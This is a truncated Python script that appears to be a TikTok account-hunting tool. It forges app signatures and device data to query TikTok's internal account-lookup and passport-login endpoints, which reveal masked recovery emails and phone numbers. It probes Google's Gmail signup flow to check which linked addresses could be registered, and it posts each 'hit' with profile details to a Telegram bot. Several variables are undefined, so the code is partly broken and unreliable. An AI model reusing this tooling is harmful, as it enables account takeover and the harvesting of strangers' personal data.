	'48a1d0adf988fb326d4f1ce055c035d1',
	'cf8f84b31ddb5f2606331fc75b6d10b5',
	'b031795f45495345b7ed3bcee2be2e05',
	'6e6ebdef9d110ea8468066a99fb35431',
	'a632f2d750d448cee6638143077e4616',
	'05398d4cab356ef576ac59d31e024c5b',
	'd62a23f3121daaea933ab827e6a7296d',
	'ee266ccac29b40c71a725b47f907bdfa',
	'4d33e970315daccdfa98b0bcd289a148',
	'4de29081b58fa894e2d9dae77cc8c007',
	'05c9711180d7c27eca7c0350d3a21724',
	'fa9ccab8a9febe630c9507dd798cf2c4',
	'c305ff6eff7d6539d239fa930336f249',
	'6949c01623b5e1b80c34e8f8b69427e2',
	'03658898aa705236a6196c3a45a1a08c',
	'a7a3e019f5acb50780d666c77da882bd',
	'acd45982ed97a57232c039cdbd0361a0',
	'510341fb6c3b5b93403b170f6fcfcf71',
	'7ddfd72ec2f19222cf1d39d936e37464',
	'8b2ac569d5067237105dc2d3a9c882dd',
	'a05c9cbadfc557f88c84231e91811473',
	'e26f693a49e67140f8130cf8aaf43ac8',
	'4b41f36dec3ec80b06e867cc4d510da4',
	'e08a945fe0f95eac0825e672e5da6399',
	'aaf4396b09b2a4ae6e94e87ea355d55e',
	'62c00fd6a6ebcfa01d34c5c7e9d76fee',
	'2b944b383cbca03aaac4ffc480e607e3',
	'32165cabd98d4961d2f4b4a3956da32e',
	'21d395931e48f9e77ddd29b30e12dabe',
	'b18863134f8644b046da0ef596c95948',
	'3ef3e2f6770c58b0a33999646ac5da09',
	'4df9ab652a37448b8f1d0c260a8b36c1',
	'02a749bbec10504f4458d7408af358be',
	'9e216d83dc21148e2908873c11e8dfe5',
	'2d89305cb842264795438a7becae7746',
	'ac9989d3dd0780057acbc431a4615aab',
	'2d64fbd41353134661267af9b543d603',
	'13cfd7515fd4f8e7c3fb1c2baee1d4e5',
	'9d5d2ce46011f31fd5bb44db0aadeec7',
	'2cd4f11db806bcfdbcc080287a6a24ce',
	'a0262d0d3c387d058425f772ef2aaddc',
	'd0d4651a4b9d7de6021f5aeb39c18cb3',
	'72f145dc8a75e265ee9e54ad48d03acf',
	'02940f5f24ce2b3dc2979385fc0a0e4f',
	'1747d761d4186b49720c4553bf8e429b',
	'fc91720d1e5722dea724f96cbe7be48b',
	'90f2f7e5b184e93538b7b07aee552a7a',
	'ce87e30cd6ecdd4946b6521dc6f7f28e',
	'7b71295b2b7ece941b563d9f5a13c5d9',
	'cd8bd19192cc165634eb9b625fa51197',
	'1750338f93bf15532b7875c2fc7e5edf',
	'26af96223c9534a1fbcb6ace2669ee03',
	'1c3d0dce7e09dc846b195436a6feca5c',
	'1883abaa2abb68dfaa5385ffd8fb1210',
	'd078ec8a3d4d76336f7f5ef102a93960',
	'b9a7d4a3fe37320114a8616374025c27',
	'3fd8fc9ecff1fd02eb2188917cf9305c',
	'c6e7f8edb527733c6c83ec353d8e39d7',
	'4a502defc0a2b58eb571146bbf9f9d88',
	'38c1662a5a6f7d61b36a28c2a64c3a5c',
	'e60f73fa0e6c40d7b7ff7e6cbf84d3a3',
	'dbcc9b8c283f410c6358bc23c24a5f3e'
	
'6d66c8148d4dc14d5fcf815f2adf9d66',
'686ed6ce7442dd7283421250a8560971',
'563706cba3430973e6775fa8e05d010f',
'4c914850c48c30932cdc890d90ad0aa9',
'8a0f805b4ffaed72f1d8baeb5011c862',
'e072272a7a837d71042fed185630d86e',
'fafeea423aab4765588cca408d734e80',
'120d65558900a8eab61f3ade4d1de1e2',
'28ade3a02b4f5bb113172cbf7d65e617',
'3ba2671e4af7171f04125f5977b39f34',
'5d002f329e451da117c0ab218941c66e',
'6e09e61e8356d472c39f60d8962b86f9',
'30fe4c88e1e66f7dd16653b9492ba36a',
'07b1dfefc4e33a5ef97dfd8cb0255763',
'1942d5a4ee45f83694211a3caffa45fa',
'1b4265e9979f18673b948f26081a438a',
'97c2f594685a1880c8da5ee6f1be4701',
'81e371d0984593f50a4dbd14a4aac49d',
'45290960247d4bcbdefa036387c6df91',
'8a94188e4942352e480b01dd43048bed',
'5b81a6159ed4113b432daf9e0c91e0fd',
'c39ddb69a50776760d5b25a3c2a055d4',
'a8361af54392d1dd5ea566f6514447cf',
'd26a51b3deaad301b9527610c5d9a42d',
'88edad4c57dc14c24fd1e82fd42d42d6',
'5b3b7538f89d2115ac2dc405c9a9bb31',
'7e0d4177ee71eb4a343288c8728f7b9a',
'bac58389187f91a03c93227a1c397644',
'ee6ac8d11d0b1276acf55216b44553b7',
'6c034901c740cb3eac51c943413d8856',
'7bf2de22f991060a6141fdc4e896dc2b',
'2a2cdc1f66a0498f79ac00ae35ab8c79',
'4f5f81bc2848959420b073338ed54d56',
'6011989b80ef65d90533fe6aeedc253d',
'c5b4c473169b9c0b2408264f66169480',
'bb6b9933c604e2ad06994f5948b5e5e2',
'1bd5a14efd3cd6a932a99560fe33e722',
'5e4d9865cb984ef6158b874e1a716058',
'287427a2257b70959ca2eaddc2ed93d7',
'91879ed15c4897bee12933fbc85f7dbd',
'bfbc77e6b6080387483a8d65dc65b4d8',
'68fe5cb10014acb91b8b736040f15ecc',
'f85cde338cc29a9f422fd65597e881e3',
'e785f7619d34a01c5080d6aec845fb56',
'c3822f475d4e3595f597c7654fc13ddb',
'a02a87714453f84ee9cae66eb9eeccfa',
'fd5a5f1088fcef75ae69ca61d016e5d3',
'bc07039e102965fc3179c97ff21a8ab6',
'195e9b035b251c2d3634aa928dd9843e',
'7d171ca5d1f3ef7e66196931be68eba3',
'40bcd1acc1a0301ef3e271591d9457d2',
'74b0d1bed05b4be20e8843ffc19a48b3',
'14f26fa7763b7d5811f2666fe4da1209',
'7e003c92e691d84199b14839c1ef64b0',
'3e61ce7142962d916f4da9040b2fbd20',
'8dce1f1f0bd328bb846dfb377c90c365',
'ce434ca201e1ba3767873ccb70564fa4',
'7fab9165de8fc21a90c46d50d72d9401',
'525afdd4f29684e6fafbdeca93df035f',
'9590fa56fb2540b5f365b9a976458c01',
'def4d641a7f0e2e78b9beaa1b149e5dd',
'837a725616adf0f9c176f9dc305f3c35',
'7b09cdd1f2fdc2956999aad5e7cf1d5d',
'f831f78ac2663865dd43baacf52675f5',
'9c610b64e137cfa793a3eb1019c8818b',
'fe970bf6e7bd91a72bf6bbce7e4290e5',
'876d9b2a11b7ab20f34b180024221fbf',
'1a3a4614874a1f322fcda8d39db9a4ca',
'c71a530de36e468853a9f7c01c68e1fe',
'5fa47029583ebc2f02f3a8fa9cf43e6a',
'53df826d423e24616e720f4876bb5caa',
'b7bd5eb856ccc65324a703e18ead582c',
'68debc9a5ccb3c2a2cb14d2b85333716',
'2c02df28e1bbff0b3e9c29f96136d489',
'073fd26968357915689eb4849ecf3f3f',
'5989a6bc7008663ecb628891f6378614',
'270f9222eac7bc490823772ab6e2e5d6',
'9784c636cb613f5ffc9a2e088e6b52c9',
'da881e00f5ee6a8e8bdd8e204fba86c1',
'0450dfad42e8db67d641239eabbed617',
'41c1e8b111dfa0775e886ea1b109c034',
'9b6366a935b979859d735d6118b5569a',
'4948cab01813b7f45ce3ed83deb24610',
'4cbaea00da85706ed949a07ad0ff6319',
'182e7f44d791c249fcf5fe59fd986f1c',
'5d089b27d551ad19d34851edcca194d1',
'ccf708bcb2f4af8b61d01d41e11dda70',
'a16fa6c5be204caeef3e2db9abf7e54a',
'13172a5518fda52541c70ff0aafcbd27',
'e3bb7e67163a29bb0fc06e7e0785eb1d',
'de97ad66ce1497cf4d8b9d110dea93fb',
'72caa1c98fcb6f32f6e850bd4c35db82',
'5929a192c3372c966302a87ff6844b16',
'85243404172696b81af6e784d2d513d2',
'e7972403986ecaa1a0218b37b5e7f742',
'887d76695909dbe9feff5304f27f7351',
'32b74ddf8bd87ae98105f39614179819',
'330cef7f38c7c7b0547b08cbfad4fe0f',
'1cd5e5617199bd681f212563c62560cd',
'aa04acd6be5212dfb5359d917bc400bb',
'f6e082e9ad09055e18d964671d34418a',
'ded1defb1fcea071e414129961584569',
'3e95a8f74f9ab758c1da6133ac8e2e35',
'7cdf51082ffce2906b8691f96dd1a767',
'6778f0db1ed71ec9ca743590659e0a40',
'e9c9b92e3886039be3f3295c2209958e',
'0e1d791a3a9a7f97d735ba461616b3e2',
'673d8b3404eef8cbccd8597b89825342',
'0db62758493f7a0efb062044ac068dac',
'766be2c21fbe7ac435b0ce427ad8d411',
'ded062e4a4536dbbcb8aa82c860b2ec7',
'4f761f08a724692c9ecb5e7fc54cbea3',
'b6acb99c05b13b9ff866c26ee64a8fa8',
'fd61effb1d65a1b01c820361d8228c7c',
'd670e72823c751079017ca9a3b21020c',
'8d7571beb5a4285e6bccfa4cc6a4d502',
'3100e89c7b0d70e8a0f41233b28a769c',
'7001dc2643f83cf6e72def00fbccfc6f',
'5081bf0f8e54a1dd28629a50ae0b0e01',
'bfc82e343da85c35fe61dd8bff25fb77',
'46a8ef281a146aa734c5527148003fe5',
'df395f8ac47b3db8e9a8f899ac5937d3',
'd08e27df2c75af9276fc4b0f60d72d19',
'9ef5dd91a967ac5eb3deaa8e78adf7d4',
'780ec01c3c98a08b5af4bd334193142a',
'85cfcd1bcd5faac84efea1d806f74011',
'627f9797da21ddae8252afb2b6f31265',
'cd84eac5b77b47ea35832b713c56c052',
'fff60f27b77c81727fc51a6179efb9db',
'b9a1abec083377c00257c871ad364c1a',
'fe91a0a59dd0603e224b0b842894615c',
'0f79903bbb09b892cc79681bb0aca6a6',
'e457dac351c5f007b9a7576feafa14f0',
'10be1a172b9abb6d00176e99cb2e88e7',
'3fea0a59ae22f9576af3ae80a35229dc',
'65962c240045a234b26bb4eda36dcd04',
'cfa66361c270cd60c91525d8178b14b0',
'f9234f85851b66544e4d6db8be835ff5',
'b3c0884647b28c29c6b55ca22b615798',
'ee504e276daa005328e6c100cef59839',
'8f612ea133026f909d6a772b698635dc',
]

import os, time, random, uuid, binascii, json, secrets, re
import requests
from requests import Session, get
import SignerPy

import re, os, urllib.parse, random, binascii, uuid, time, secrets, string
try:
    import requests
    from MedoSigner import Argus, Gorgon, Ladon, md5
except ImportError:
    os.system('pip install requests pycryptodome MedoSigner')
    import requests
    from MedoSigner import Argus, Gorgon, Ladon, md5

def get_tiktok_level(username):
    username = str(username)
    def info(username):
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel=googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6"
        }
        try:
            tikinfo = requests.get(f'https://www.tiktok.com/@{username}', headers=headers, timeout=10).text
            info = tikinfo.split('webapp.user-detail"')[1].split('"RecommenUserList"')[0]
            id = info.split('id":"')[1].split('",')[0]
            return id
        except:
            return 'h'
    def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload is not None else None
        if not unix:
            unix = int(time.time())
        return Gorgon(params, unix, payload, cookie).get_value() | {
            "x-ladon": Ladon.encrypt(unix, license_id, aid),
            "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
        }
    def get_level(username):
        id = info(username)
        if id == 'h':
            return 'h'
        url = f"https://webcast16-normal-no1a.tiktokv.eu/webcast/user/?request_from=profile_card_v2&request_from_scene=1&target_uid={id}&iid={random.randint(1, 10**19)}&device_id={random.randint(1, 10**19)}&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid={binascii.hexlify(os.urandom(8)).decode()}&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket={round(random.uniform(1.2, 1.6) * 100000000) * -1}4632&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts={round(random.uniform(1.2, 1.6) * 100000000) * -1}&cdid={uuid.uuid4()}&webcast_sdk_version=2920&webcast_language=ar&webcast_locale=ar_IQ"
        headers = {
            'User-Agent': "com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)"
        }
        headers.update(sign(url.split('?')[1], '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233))
        try:
            response = requests.get(url, headers=headers)
            level = re.search(r'"default_pattern":"(.*?)"', response.text).group(1)
            return int(level.split(' Levele ')[1])
        except:
            return 'h'
    level = get_level(username)
    if level != 'h':
        levele=f"{level}"
    else:
        levele=" None "
    return levele
def check_rest(username):
    result = {}
    try:
        user = str(username)
        cog = secrets.token_hex(16)
        cookies = {
            "passport_csrf_token": cog,
            "passport_csrf_token_default": cog
        }
        s = Session()
        s.cookies.update(cookies)

        url_lookup = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/username/"
        params = {
            'request_tag_from': "h5",
            'fixed_mix_mode': "1",
            'mix_mode': "1",
            'account_param': user,
            'scene': "4",
            'device_platform': "android",
            'os': "android",
            'ssmix': "a",
            '_rticket': str(int(time.time() * 1000)),
            'cdid': str(uuid.uuid4()),
            'channel': "googleplay",
            'aid': "1233",
            'app_name': "musical_ly",
            'version_code': "370805",
            'version_name': "37.8.5",
            'manifest_version_code': "2023708050",
            'update_version_code': "2023708050",
            'ab_version': "37.8.5",
            'resolution': "720*1448",
            'dpi': "320",
            'device_type': "RMX3269",
            'device_brand': "realme",
            'language': "ar",
            'os_api': "30",
            'os_version': "11",
            'ac': "wifi",
            'is_pad': "0",
            'current_region': "IQ",
            'app_type': "normal",
            'sys_region': "IQ",
            'last_install_time': str(int(time.time()) - 4000),
            'mcc_mnc': "41840",
            'timezone_name': "Asia/Baghdad",
            'carrier_region_v2': "418",
            'residence': "IQ",
            'app_language': "ar",
            'carrier_region': "IQ",
            'timezone_offset': "10800",
            'host_abi': "arm64-v8a",
            'locale': "ar",
            'ac2': "wifi",
            'uoo': "0",
            'op_region': "IQ",
            'build_number': "37.8.5",
            'region': "IQ",
            'ts': str(int(time.time())),
            'iid': str(random.randint(1, 10**19)),
            'device_id': str(random.randint(1, 10**19)),
            'openudid': binascii.hexlify(os.urandom(8)).decode(),
            'support_webview': "1",
            'cronet_version': "75b93580_2024-11-28",
            'ttnet_version': "4.2.210.6-tiktok",
            'use_store_region_cookie': "1",
            'app_version': "37.8.5"
        }
        sig = SignerPy.sign(params=params, cookie=cookies)
        headers = {
            'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 11; ar; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)",
            'Accept': "application/json, text/plain, */*",
            'content-length': "0",
            'x-tt-referer': "https://inapp.tiktokv.com/ucenter_web/account_lookup_tool",
            'x-tt-passport-csrf-token': cog,
            'content-type': "application/x-www-form-urlencoded",
            'x-argus': sig["x-argus"],
            'x-gorgon': sig["x-gorgon"],
            'x-khronos': sig["x-khronos"],
            'x-ladon': sig["x-ladon"],
        }
        r1 = s.post(url_lookup, params=params, headers=headers)
        j1 = r1.json()
        accounts = j1.get('data', {}).get('accounts', [])
        if not accounts:
            return result
        passport_ticket = accounts[0].get('passport_ticket')
        api_username = accounts[0].get('username', user)
        result['username'] = api_username
        if passport_ticket:
            params['passport_ticket'] = passport_ticket
            sig2 = SignerPy.sign(params=params, cookie=cookies)
            headers.update({
                'x-argus': sig2["x-argus"],
                'x-gorgon': sig2["x-gorgon"],
                'x-khronos': sig2["x-khronos"],
                'x-ladon': sig2["x-ladon"],
            })
            url_login = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"
            r2 = s.post(url_login, params=params, headers=headers)
            conf_raw = r2.headers.get("x-tt-verify-idv-decision-conf")
            if conf_raw:
                try:
                    conf = json.loads(conf_raw)
                    for extra in conf.get('extra', []):
                        oo = extra.get('info', '')
                        if '@' in oo:
                            result['rest'] = oo
                            domain_part = oo.split('@', 1)[1]
                            local_rest = oo.split('@', 1)[0]
                            if (user and local_rest and user[0] == local_rest[0] and user[-1] == local_rest[-1]):
                                try:
                                    web_headers = {'User-Agent': 'Mozilla/5.0'}
                                    page = get(f'https://www.tiktok.com/@{user}', headers=web_headers, timeout=10).text
                                    if 'followerCount":' in page:
                                        followers = page.split('followerCount":')[1].split(',')[0]
                                        result['followers'] = followers
                                    result['email'] = f"{user}{domain_part}"
                                except:
                                    pass
                        elif '+' in oo:
                            result['number'] = oo
                        else:
                            if 'result' not in result:
                                result['result'] = oo
                except:
                    pass

        return result
    except Exception:
        return result
def compare_rest(rest, hit):
    try:
        rest_local = rest.split('@')[0]
        hit_local = hit.split('@')[0]
        if rest_local[0] == hit_local[0] and rest_local[-1] == hit_local[-1]:
            return True
        else:
            return False
    except:
        return False
def info(email):
    username=email.split("@")[0]
    levele = get_tiktok_level(username)
    rest_data = check_rest(username)
    rest_value = rest_data.get('rest', 'Rest is not available !')
    match_status = "None"
    if rest_value != 'Note':
        if compare_rest(rest_value, email):
        	match_status = "None"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    try:
        url = f"https://www.tiktok.com/@{username}"
        response = requests.get(url, headers=headers, timeout=15)
        html = response.text
        m = re.search(r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__".*?>(.*?)</script>', html)
        if not m:
            ff = f"""
[New hits acount]            
═━═━═━═━═━═━═━═━═━
❄️Username :  @{account_data['user']}
❄️Email  :  {email} 
═━═━═━═━═━═━═━═━═━
            """
            requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
                          params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})
            print(ff)
            return
    
        data_json = json.loads(m.group(1))
        iinfo = data_json['__DEFAULT_SCOPE__']['webapp.user-detail']['userInfo']
        user_obj = iinfo['user']
        stats = iinfo['stats']
        create_time = user_obj.get("createTime")
        create_date = datetime.datetime.fromtimestamp(int(create_time)).strftime("%Y-%m-%d") if create_time else "غير معلوم"                    
        account_data = {
            'id': user_obj.get('id', 'N/A'),
            'user': user_obj.get('uniqueId', username),
            'name': user_obj.get('nickname', 'N/A'),
            'folos': format(stats.get('followerCount', 0), ',d'),
            'folon': format(stats.get('followingCount', 0), ',d'),
            'priv': 'نعم' if user_obj.get('privateAccount') else 'لا',
            'lik': format(stats.get('heartCount', 0), ',d'),
            'vid': format(stats.get('videoCount', 0), ',d'),
            'created': create_date,
            'language': user_obj.get('language', 'غير معلوم'),
        }        
        ff = f"""
[New hits acount]
═━═━═━═━═━═━═━═━═━═━═━═
❄️Name :  {account_data['name']}
❄️Username :  @{account_data['user']}
❄️Email  :  {email} 
❄️Followers :  {account_data['folos']}
❄️Following :  {account_data['folon']}
❄️Likes :  {account_data['lik']}
❄️Id :  {account_data['id']}
❄️Created At  : {account_data['created']}
❄️Videos : {account_data['vid']}
❄️Private : {account_data['priv']}
❄️Language    : {account_data['language']}
❄️Programe : @oo22bb
═━═━═━═━═━═━═━═━═━═━═━═
        """.strip()
        with open(send, "a", encoding="utf-8") as f:
            	f.write(ff + "\n" )
        print(ff)
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
                      params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})

    except Exception as e:
        ff = f"""
[New hits acount]        
═━═━═━═━═━═━═━═━═━
❄️Username :  @{account_data['user']}
❄️Email  :  {email} 
═━═━═━═━═━═━═━═━═━
        """.strip()
        print("خطأ:", e)
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
                      params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})
def check_gmail(email):
    global ya,no,yas,nod
    if '@' in email:email=email.split('@')[0]
    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
        return False
    s = requests.Session()
    try:
            headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://accounts.google.com/',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-browser-channel': 'stable',
    'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
    'x-browser-year': '2024',
}
            params = {
    'biz': 'false',
    'continue': 'https://mail.google.com/mail/u/0/',
    'ddm': '1',
    'emr': '1',
    'flowEntry': 'SignUp',
    'flowName': 'GlifWebSignIn',
    'followup': 'https://mail.google.com/mail/u/0/',
    'osid': '1',
    'service': 'mail',
}
            response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
            tl=response.url.split('TL=')[1]
            s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
            at = response.text.split('"SNlM0e":"')[1].split('"')[0]
            pass
    except:''
    try:
            name = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for i in range(randrange(5,10)))
            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
    'x-same-domain': '1',
}
            params = {
    'rpcids': 'E815hb',
    'source-path': '/lifecycle/steps/signup/name',
    'hl': 'en-US',
    'TL': tl,
    'rt': 'c',
}
            data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)
            response = s.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,
    headers=headers,
    data=data,
).text
            if 'steps/signup/birthdaygender' in response:
                pass
    except:''
    try:
            birthday = randrange(1980,2010),randrange(1,12),randrange(1,28)
            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
    'x-same-domain': '1',
}
            params = {
    'rpcids': 'eOY7Bb',
    'source-path': '/lifecycle/steps/signup/birthdaygender',
    'hl': 'en-US',
    'TL': tl,
    'rt': 'c',
}
            data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2